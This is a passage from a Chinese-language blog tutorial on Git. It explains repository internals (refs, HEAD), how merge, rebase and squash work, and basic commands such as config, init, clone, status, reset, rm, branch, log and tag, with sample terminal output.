以观察变化.</span><br></pre></td></tr></table></figure><p>可以观察到这一次的 commit 多了一个 parent 的行，其中的 <strong>“指纹”</strong> 和上一次的 commit 一模一样，当我们提交两个 commit 之后我们的 Git 仓库可以简化为下图：</p><p><img src="/2019/09/23/git/git_6.png" alt></p><ul><li>说明：其中因为我们 test 文件夹新增了文件，也就是出现了变化，所以就被标识成了新的 tree 类型的对象；</li></ul><h4 id="refs-目录"><a href="#refs-目录" class="headerlink" title="refs 目录"></a>refs 目录</h4><p>refs 目录存储都是引用文件，如本地分支，远端分支，标签等</p><ul><li>refs/heads/xxx 本地分支</li><li>refs/remotes/origin/xxx 远端分支</li><li>refs/tags/xxx 本地tag</li></ul><p>引用文件的内容都是 40 位长度的 commit</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat .git/refs/heads/master</span><br><span class="line">9dfabac68470a588a4b4a78742249df46438874a</span><br></pre></td></tr></table></figure><p>这就像是一个指针一样，它指向了你的最后一次提交（例如这里就指向了第二次提交的 commit），我们补充上分支信息，现在的 Git 仓库就会像下图所示：</p><p><img src="/2019/09/23/git/git_7.png" alt></p><h4 id="HEAD-目录"><a href="#HEAD-目录" class="headerlink" title="HEAD 目录"></a>HEAD 目录</h4><p>HEAD 目录下存储的是当前所在的位置，其内容是分支的名称：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat HEAD</span><br><span class="line">ref: refs/heads/master</span><br></pre></td></tr></table></figure><p>我们再补充上 HEAD 的信息，现在的 Git 仓库如下图所示：</p><p><img src="/2019/09/23/git/git_8.png" alt></p><h3 id="git的冲突处理"><a href="#git的冲突处理" class="headerlink" title="git的冲突处理"></a>git的冲突处理</h3><p>以下主要参考以下两篇文章</p><blockquote><p><a href="https://www.wmyskxz.com/2019/08/16/git-yuan-li-ru-men-jian-xi/#toc-heading-11" target="_blank" rel="noopener">git冲突处理图解</a></p><p><a href="https://coding.net/help/doc/practice/git-principle.html" target="_blank" rel="noopener">使用原理视角看 Git</a></p></blockquote><p>讲完git的目录结构，我们可知道分支在git中仅是一个指针，但是在分布式工作中，无可避免的会遇见冲突（分支的合并）</p><p><img src="/2019/09/23/git/git_9.png" alt></p><p>图上的情况，并不是移动分支指针就能够解决问题的，它需要一种合并策略。首先我们需要明确的是谁与谁的合并，是 2，3 与 4， 5， 6 两条线的合并吗？其实并不是的，<strong>真实合并的其实只有 3 和 6，因为每一次的提交都包含了项目完整的快照，即合并只是 tree 与 tree 的合并。</strong></p><p>这可能说起来有点绕，我们可以先来想一个简单的算法，用来比较 3 和 6 的不同。如果我们只是单纯的比较 3 和 6 的信息，其实并没有意义，因为它们之间并不能确切的表达出当前的冲突状态。因此我们需要选取它们两个分支的分歧点（merge base）作为参考点，进行比较。</p><p>首先我们把 1 作为基础，然后把 1、3、6 中所有的文件做一个列表，然后依次遍历这个列表中的文件。我们现在拿列表中的一个文件进行举例，把在提交在 1、3、6 中的该文件分别称为版本1、版本3、版本6，可能出现如下几种情况：</p><p><strong>1. 版本 1、版本 3、版本 6 的 “指纹” 值都相同：</strong>这种情况则说明没有冲突；<br><strong>2. 版本 3 or 版本 6 至少有一个与版本 1 状态相同（指的是指纹值相同或都不存在）：</strong>这种情况可以自动合并，比如版本 1 中存在一个文件，在版本 3 中没有对该文件进行修改，而版本 6 中删除了这个文件，则以版本 6 为准就可以了；<br><strong>3. 版本 3 or 版本 6 都与版本 1 的状态不同：</strong>这种情况复杂一些，自动合并策略很难生效了，所以需要手动解决；</p><h4 id="merge-操作"><a href="#merge-操作" class="headerlink" title="merge 操作"></a>merge 操作</h4><p>在解决完冲突后，我们可以将修改的内容提交为一个新的提交，这就是 merge。</p><p><img src="/2019/09/23/git/git_11.png" alt="img"></p><p>可以看到 merge 是一种不修改分支历史提交记录的方式，这也是我们常用的方式。但是这种方式在某些情况下使用起来不太方便，比如我们创建了一些提交发送给管理者，管理者在合并操作中产生了冲突，还需要去解决冲突，这无疑增加了他人的负担。</p><p>而我们使用 rebase 可以解决这种问题。</p><h4 id="rebase-操作"><a href="#rebase-操作" class="headerlink" title="rebase 操作"></a>rebase 操作</h4><p>假设我们的分支结构如下：</p><p><img src="/2019/09/23/git/git_11.png" alt="img"></p><p>rebase 会把从 Merge Base 以来的所有提交，以补丁的形式一个一个重新打到目标分支上。这使得目标分支合并该分支的时候会直接 <strong>Fast Forward</strong>（可以简单理解为直接后移指针），即不会产生任何冲突。提交历史是一条线，这对强迫症患者可谓是一大福音。</p><p><img src="/2019/09/23/git/git_12.png" alt="img"></p><p>其实 rebase 主要是在 .git/rebase-merge 下生成了两个文件，分别为 git-rebase-todo 和 done 文件，这两个文件的作用光看名字就大概能够看得出来。git-rebase-todo 中存放了 rebase 将要操作的 commit，而 done 存放正操作或已操作完毕的 commit，比如我们这里，git-rebase-todo 存放了 4、5、6 三个提交。</p><p><img src="/2019/09/23/git/git_13.png" alt="img"></p><p>首先 Git 会把 4 这个 commit 放入 done，表示正在操作 4，然后将 4 以补丁的方式打到 3 上，形成了新的 4`，这一步是可能产生冲突的，如果有冲突，需要解决冲突之后才能继续操作。</p><p><img src="/2019/09/23/git/git_14.png" alt="img"></p><p>接着按同样的方式把 5、6 都放入 done，最后把指针移动到最新的提交 6 上，就完成了 rebase 的操作。</p><p><strong>从刚才的图中，我们就可以看到 rebase 的一个缺点，那就是修改了分支的历史提交。</strong>如果已经将分支推送到了远程仓库，会导致无法将修改后的分支推送上去，必须使用 -f 参数（force）强行推送。</p><p><strong>所以使用 rebase 最好不要在公共分支上进行操作。</strong></p><h4 id="Squash-and-Merge-操作"><a href="#Squash-and-Merge-操作" class="headerlink" title="Squash and Merge 操作"></a>Squash and Merge 操作</h4><p>简单说就是压缩提交，把多次的提交融合到一个 commit 中，这样的好处不言而喻，我们着重来讨论一下实现的技术细节，还是以我们上面最开始的分支情况为例，首先，Git 会创建一个临时分支，指向当前 feature 的最新 commit。</p><p><img src="/2019/09/23/git/git_15.png" alt="img"></p><p>然后按照上面 rebase 的方式，变基到 master 的最新 commit 处。</p><p><img src="/2019/09/23/git/git_16.png" alt="img"></p><p>接着用 rebase 来 squash 之，压缩这些提交为一个提交。</p><p><img src="/2019/09/23/git/git_17.png" alt="img"></p><p>最后以 fast forward 的方式合并到 master 中。</p><p><img src="/2019/09/23/git/git_18.png" alt="img"></p><p>可见此时 master 分支多且只多了一个描述了这次改动的提交，这对于大型工程，保持主分支的简洁易懂有很大的帮助。</p><h2 id="git基本操作"><a href="#git基本操作" class="headerlink" title="git基本操作"></a>git基本操作</h2><h3 id="git配置"><a href="#git配置" class="headerlink" title="git配置"></a>git配置</h3><p>Git 提供了一个叫做 git config 的工具，专门用来配置或读取相应的工作环境变量。<br>这些环境变量，决定了 Git 在各个环节的具体工作方式和行为。这些变量可以存放在以下三个不同的地方：</p><blockquote><p>/etc/gitconfig 文件：系统中对所有用户都普遍适用的配置。若使用 git config 时用 –system 选项，读写的就是这个文件。<br>~/.gitconfig 文件：用户目录下的配置文件只适用于该用户。若使用 git config 时用 –global 选项，读写的就是这个文件。<br>当前项目的 Git 目录中的配置文件（也就是工作目录中的 .git/config 文件）：这里的配置仅仅针对当前项目有效。每一个级别的配置都会覆盖上层的相同配置，所以 .git/config 里的配置会覆盖 /etc/gitconfig 中的同名变量。</p><p>在 Windows 系统上，Git 会找寻用户主目录下的 .gitconfig 文件。主目录即 $HOME 变量指定的目录，一般都是 C:\Documents and Settings\$USER。</p><p>此外，Git 还会尝试找寻 /etc/gitconfig 文件，只不过看当初 Git 装在什么目录，就以此作为根目录来定位。</p></blockquote><h4 id="1-用户信息-git-config-user"><a href="#1-用户信息-git-config-user" class="headerlink" title="1.用户信息    git config user"></a>1.用户信息    <code>git config user</code></h4><p>在使用git提交前，一定要配置提交者个人的用户名称和电子邮件</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">"wyndam"</span></span><br><span class="line">$ git config --global user.email <span class="string">"only.night@qq.com"</span></span><br></pre></td></tr></table></figure><p>如果用了<em><code>--global</code></em>选项，那么更改的配置文件就是位于你用户主目录下的那个，以后你所有的项目都会默认使用这里配置的用户信息。<br>如果要在某个特定的项目中使用其他名字或者电邮，只要去掉<em>–global</em>选项重新配置即可，新的设定保存在当前项目的 .git/config 文件里。</p><h4 id="2-文本编辑器"><a href="#2-文本编辑器" class="headerlink" title="2.文本编辑器"></a>2.文本编辑器</h4><p>设置Git默认使用的文本编辑器, 一般可能会是 Vi 或者 Vim。如果你有其他偏好，比如 Emacs 的话，可以重新设置：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global core.editor emacs</span><br></pre></td></tr></table></figure><h4 id="3-差异分析工具"><a href="#3-差异分析工具" class="headerlink" title="3.差异分析工具"></a>3.差异分析工具</h4><p>还有一个比较常用的是，在解决合并冲突时使用哪种差异分析工具。比如要改用 vimdiff 的话：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git config --global merge.tool vimdiff</span><br></pre></td></tr></table></figure><p>Git 可以理解 kdiff3，tkdiff，meld，xxdiff，emerge，vimdiff，gvimdiff，ecmerge，和 opendiff 等合并工具的输出信息。<br>当然，你也可以指定使用自己开发的工具。</p><h4 id="4-查看配置信息-git-config-list"><a href="#4-查看配置信息-git-config-list" class="headerlink" title="4.查看配置信息    git config --list"></a>4.查看配置信息    <code>git config --list</code></h4><p>要检查已有的配置信息，可以使用 git config –list 命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">$ git config --list</span><br><span class="line"></span><br><span class="line">core.symlinks=<span class="literal">false</span></span><br><span class="line">core.autocrlf=<span class="literal">true</span></span><br><span class="line">color.diff=auto</span><br><span class="line">color.status=auto</span><br><span class="line">color.branch=auto</span><br><span class="line">color.interactive=<span class="literal">true</span></span><br><span class="line">pack.packsizelimit=2g</span><br><span class="line">help.format=html</span><br><span class="line">http.sslcainfo=E:/Platform/Git/mingw32/ssl/certs/ca-bundle.crt</span><br><span class="line">diff.astextplain.textconv=astextplain</span><br><span class="line">rebase.autosquash=<span class="literal">true</span></span><br><span class="line">filter.lfs.clean=git-lfs clean %f</span><br><span class="line">filter.lfs.smudge=git-lfs smudge %f</span><br><span class="line">filter.lfs.required=<span class="literal">true</span></span><br><span class="line">user.name=Wyndam</span><br><span class="line">user.email=only.night@qq.com</span><br><span class="line">core.editor=subl</span><br></pre></td></tr></table></figure><p>有时候会看到重复的变量名，那就说明它们来自不同的配置文件（比如 /etc/gitconfig 和 ~/.gitconfig），不过最终 Git 实际采用的是最后一个。<br>这些配置我们也可以在 ~/.gitconfig 或 /etc/gitconfig 看到，如下所示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[filter &quot;lfs&quot;]</span><br><span class="line">    clean = git-lfs clean %f</span><br><span class="line">    smudge = git-lfs smudge %f</span><br><span class="line">    required = true</span><br><span class="line">[user]</span><br><span class="line">    name = Wyndam</span><br><span class="line">    email = only.night@qq.com</span><br><span class="line">[core]</span><br><span class="line">    editor = subl</span><br></pre></td></tr></table></figure><p>也可以直接查阅某个环境变量的设定，只要把特定的名字跟在后面即可，像这样：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ git config user.email</span><br><span class="line"></span><br><span class="line">magic@outlook.com</span><br></pre></td></tr></table></figure><h3 id="新建git本地仓库"><a href="#新建git本地仓库" class="headerlink" title="新建git本地仓库"></a>新建git本地仓库</h3><p>Git 使用 git init 命令来初始化一个 Git 仓库，Git 的很多命令都需要在 Git 的仓库中运行，所以 git init 是使用 Git 的第一个命令。<br>在执行完成 git init 命令后，Git 仓库会生成一个 .git 目录，该目录包含了资源的所有元数据，其他的项目目录保持不变（不像 SVN 会在每个子目录生成 .svn 目录，Git 只在仓库的根目录生成 .git 目录）。</p><p>在工作目录下使用命令<code>git init</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$git</span> init (path)</span><br></pre></td></tr></table></figure><p>若没有指定path，则默认当前目录下建立git仓库。</p><p>初始化后，会在工作目录下会出现一个名为 .git 的目录，所有 Git 需要的数据和资源都存放在这个目录中。<br>如果当前目录下有几个文件想要纳入版本控制，需要先用 git add 命令告诉 Git 开始对这些文件进行跟踪，然后提交：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ git add . (path|file)</span><br><span class="line">$ git commit -m <span class="string">"inital commit"</span></span><br></pre></td></tr></table></figure><p>以上命令就是把文件/文件夹提交至仓库中，若是远程仓库，还需要命令<code>git    push</code></p><h3 id="复制远程仓库-git-clone"><a href="#复制远程仓库-git-clone" class="headerlink" title="复制远程仓库 git clone"></a>复制远程仓库 git clone</h3><p>我们使用 git clone 从现有 Git 仓库中拷贝项目（类似 svn checkout）。<br>克隆仓库的命令格式为:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> &lt;repo|url&gt; (&lt;directory&gt;)</span><br></pre></td></tr></table></figure><p>参数说明：</p><p>\&lt;repo|url&gt;：为Git仓库的地址url</p><p>\<directory>：为将git储存至目标目录，若为空，则默认本地目录</directory></p><p>Git支持ssh，git，http和https协议（此外，可以使用ftp和ftps进行获取，但这效率低下且不建议使用；请勿使用它）。</p><ul><li>ssh://[user@]host.xz[:port]/path/to/repo.git/</li><li>git://host.xz[:port]/path/to/repo.git/</li><li>http[s]://host.xz[:port]/path/to/repo.git/</li><li>ftp[s]://host.xz[:port]/path/to/repo.git/</li></ul><p>也可以用类似scp的语法进行clone（实际上是ssh协议）</p><ul><li>[user@]host.xz:path/to/repo.git/</li></ul><h3 id="查看状态git-status"><a href="#查看状态git-status" class="headerlink" title="查看状态git    status"></a>查看状态<code>git    status</code></h3><p>git status 以查看在你上次提交之后是否有修改。<br>我演示该命令的时候加了 -s 参数，以获得简短的结果输出。如果没加该参数会详细输出内容：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line"></span><br><span class="line">Initial commit</span><br><span class="line"></span><br><span class="line">Changes to be committed:</span><br><span class="line">  (use <span class="string">"git rm --cached &lt;file&gt;..."</span> to unstage)</span><br><span class="line"></span><br><span class="line">        new file:   README.md</span><br></pre></td></tr></table></figure><h3 id="从缓存中移除文件-git-reset-HEAD"><a href="#从缓存中移除文件-git-reset-HEAD" class="headerlink" title="从缓存中移除文件 git reset HEAD"></a>从缓存中移除文件 git reset HEAD</h3><p>git reset HEAD 命令用于取消已缓存的内容。<br>我们先改动文件 README 文件，内容如下：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">#README.md</span></span><br><span class="line"></span><br><span class="line"><span class="section">##This is readme markdown file</span></span><br></pre></td></tr></table></figure><p>HelloWorld.java 文件修改为：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorld</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"Hello World!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在两个文件修改后，都提交到了缓存区，我们现在要取消其中一个的缓存，操作如下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git status -s</span><br><span class="line"> M HelloWorld.java</span><br><span class="line"> M README.md</span><br><span class="line">$ git add .</span><br><span class="line">$ git status -s</span><br><span class="line">M  HelloWorld.java</span><br><span class="line">M  README.md</span><br><span class="line">$ git reset HEAD -- HelloWorld.java</span><br><span class="line">Unstaged changes after reset:</span><br><span class="line">M       HelloWorld.java</span><br><span class="line">$ git status -s</span><br><span class="line"> M HelloWorld.java</span><br><span class="line">M  README.md</span><br></pre></td></tr></table></figure><p>现在执行 git commit，只会将 README.md 文件的改动提交，而 HelloWorld.java 是没有的。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -m <span class="string">"change"</span></span><br><span class="line">[master ad5f6fe] change</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line">$ git status -s</span><br><span class="line"> M HelloWorld.java</span><br></pre></td></tr></table></figure><p>可以看到 HelloWorld.java 文件的修改并为提交。<br>这时我们可以使用以下命令将 HelloWorld.java 的修改提交：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ git commit -am <span class="string">"修改 HelloWorld.java 文件"</span></span><br><span class="line">[master a055c08] 修改 HelloWorld.java 文件</span><br><span class="line"> 1 file changed, 1 insertion(+), 1 deletion(-)</span><br><span class="line">$ git status</span><br><span class="line">On branch master</span><br><span class="line">nothing to commit, working directory clean</span><br></pre></td></tr></table></figure><p>简而言之，执行 git reset HEAD 以取消之前 git add 添加，但不希望包含在下一提交快照中的缓存。</p><h3 id="从缓存以及工作目录删除文件-git-rm"><a href="#从缓存以及工作目录删除文件-git-rm" class="headerlink" title="从缓存以及工作目录删除文件 git rm"></a>从缓存以及工作目录删除文件 git rm</h3><p>git rm 会将条目从缓存区中移除。这与 git reset HEAD 将条目取消缓存是有区别的。 “取消缓存”的意思就是将缓存区恢复为我们做出修改之前的样子。<br>默认情况下，git rm file 会将文件从缓存区和你的硬盘中（工作目录）删除。<br>如果你要在工作目录中留着该文件，可以使用 git rm –cached：<br>如我们删除 hello.java文件：(包括在本地目录下的文件，可能需要选项<strong>-f</strong>)</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git rm HelloWorld.java</span><br><span class="line">rm <span class="string">'HelloWorld.java'</span></span><br><span class="line">$ ls</span><br><span class="line">README.md</span><br></pre></td></tr></table></figure><p>不从工作区中删除文件：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git rm README.md --cached</span><br><span class="line">rm <span class="string">'README.md'</span></span><br><span class="line">$ ls</span><br><span class="line">README.md</span><br></pre></td></tr></table></figure><h3 id="修改缓存中文件名-git-mv"><a href="#修改缓存中文件名-git-mv" class="headerlink" title="修改缓存中文件名 git mv"></a>修改缓存中文件名 git mv</h3><p>git mv 命令做得所有事情就是 git rm –cached 命令的操作， 重命名磁盘上的文件，然后再执行 git add 把新文件添加到缓存区。<br>我们先把刚移除的 README 添加回来：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ git add README.md</span><br><span class="line">$ git mv README.md README</span><br><span class="line">$ ls</span><br><span class="line">README</span><br></pre></td></tr></table></figure><hr><h3 id="Git分支管理"><a href="#Git分支管理" class="headerlink" title="Git分支管理"></a>Git分支管理</h3><p>几乎每一种版本控制系统都以某种形式支持分支。使用分支意味着你可以从开发主线上分离开来，然后在不影响主线的同时继续工作。<br>有人把 Git 的分支模型称为”必杀技特性”，而正是因为它，将 Git 从版本控制系统家族里区分出来。<br>创建分支命令：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#创建分支</span></span><br><span class="line">$ git branch [branch name]</span><br><span class="line"><span class="comment">#切换分支</span></span><br><span class="line">$ git checkout [branch name]</span><br><span class="line"><span class="comment">#创建并切换分支</span></span><br><span class="line">$ git checkout -b [branch name]</span><br><span class="line"><span class="comment">#合并分支</span></span><br><span class="line">$ git merge</span><br><span class="line"><span class="comment">#删除分支</span></span><br><span class="line">$ git branch -d [branch name]</span><br></pre></td></tr></table></figure><h3 id="Git分支管理-1"><a href="#Git分支管理-1" class="headerlink" title="Git分支管理"></a>Git分支管理</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#列出问题</span></span><br><span class="line">$ git branch</span><br><span class="line"><span class="comment">#无参数时，该命令会列出本地分支</span></span><br><span class="line">$ git branch</span><br><span class="line">* master</span><br><span class="line"><span class="comment">#创建分支</span></span><br><span class="line">$ git branch testbranch</span><br><span class="line">$ git branch</span><br><span class="line">*branch</span><br><span class="line">testbranch</span><br><span class="line">$ git branch testing</span><br><span class="line">$ git branch -D testing</span><br><span class="line">Deleted branch testing (was 84b13b9).</span><br><span class="line"><span class="comment">#合并分支,将分支[branch name] 合并到当前分支</span></span><br><span class="line">$ git merge [branch name]</span><br><span class="line">$ git merge <span class="built_in">test</span></span><br><span class="line">Updating b04e1bb..d3c2604</span><br><span class="line">Fast-forward</span><br><span class="line"> testB | 0</span><br><span class="line"> 1 file changed, 0 insertions(+), 0 deletions(-)</span><br><span class="line"> create mode 100644 testB</span><br></pre></td></tr></table></figure><h3 id="Git-查看提交历史-git-log"><a href="#Git-查看提交历史-git-log" class="headerlink" title="Git 查看提交历史    git log"></a>Git 查看提交历史    <code>git log</code></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span></span><br><span class="line">commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>)</span><br><span class="line">Author: Magic &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:41:42 2019 +0800</span><br><span class="line"></span><br><span class="line">    ff</span><br><span class="line"></span><br><span class="line">commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)</span><br><span class="line">Author: Magic &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:40:34 2019 +0800</span><br><span class="line"></span><br><span class="line">    fuck</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以用 --oneline 选项来查看历史记录的简洁的版本</span></span><br><span class="line">$ git <span class="built_in">log</span> --oneline</span><br><span class="line">d3c2604 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>) ff</span><br><span class="line">b04e1bb (origin/master) fuck</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#可以用 --graph 选项，查看历史中什么时候出现了分支、合并。以下为相同的命令，开启了拓扑图选项：</span></span><br><span class="line">$  git <span class="built_in">log</span> --graph</span><br><span class="line">* commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>)</span><br><span class="line">| Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">| Date:   Sat Sep 28 23:41:42 2019 +0800</span><br><span class="line">|</span><br><span class="line">|     ff</span><br><span class="line">|</span><br><span class="line">* commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)</span><br><span class="line">  Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">  Date:   Sat Sep 28 23:40:34 2019 +0800</span><br><span class="line"></span><br><span class="line">      fuck</span><br><span class="line">      </span><br><span class="line"><span class="comment">#可以用 ‘--reverse’参数来逆向显示所有日志</span></span><br><span class="line">$ git <span class="built_in">log</span> --reverse</span><br><span class="line">commit b04e1bba77e04dde1e5649aaf32ef7029a1dbd5f (origin/master)</span><br><span class="line">Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:40:34 2019 +0800</span><br><span class="line"></span><br><span class="line">    fuck</span><br><span class="line"></span><br><span class="line">commit d3c26045edb80258c9b785f5cd70cff6c7130003 (HEAD -&gt; master, origin/<span class="built_in">test</span>, <span class="built_in">test</span>)</span><br><span class="line">Author: Magic-King &lt;xxx@qq.com&gt;</span><br><span class="line">Date:   Sat Sep 28 23:41:42 2019 +0800</span><br><span class="line"></span><br><span class="line">    ff</span><br></pre></td></tr></table></figure><h3 id="Git-标签-git-tag"><a href="#Git-标签-git-tag" class="headerlink" title="Git 标签  git tag"></a>Git 标签  <code>git tag</code></h3><p>如果达到一个重要的阶段，并希望永远记住那个特别的提交快照，可以使用 git tag 给它打上标签。<br>比如说，我们想为我们的项目发布一个”1.0”版本。 可以用 git tag -a v1.0 命令给最新一次提交打上（HEAD）”v1.0”的标签。<br>-a 选项意为”创建一个带注解的标签”。 不用 -a 选项也可以执行的，但它不会记录这标签是啥时候打的，谁打的，也不会让你添加个标签的注解。 我推荐一直创建带注解的标签。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$ git <span class="built_in">log</span> --oneline --graph --decorate</span><br><span class="line">*   2b5970d (HEAD -&gt; master, tag: v1.0) Merge branch <span class="string">'change_site'</span></span><br><span class="line">|\</span><br><span class="line">| * d17a0a0 (change_site) change the site</span><br><span class="line">* | e2714c9 新增加一行</span><br><span class="line">|/</span><br><span class="line">* 202199d (newtest) add test.txt file</span><br><span class="line">* a055c08 修改 HelloWorld.java 文件</span><br><span class="line">* ad5f6fe 修改</span><br><span class="line">* c2c167c 修改HelloWorld.java文件</span><br><span class="line">* f9393bf third commit ``</span><br><span class="line">* 316fafc second commit</span><br><span class="line">* fdd5c53 inital 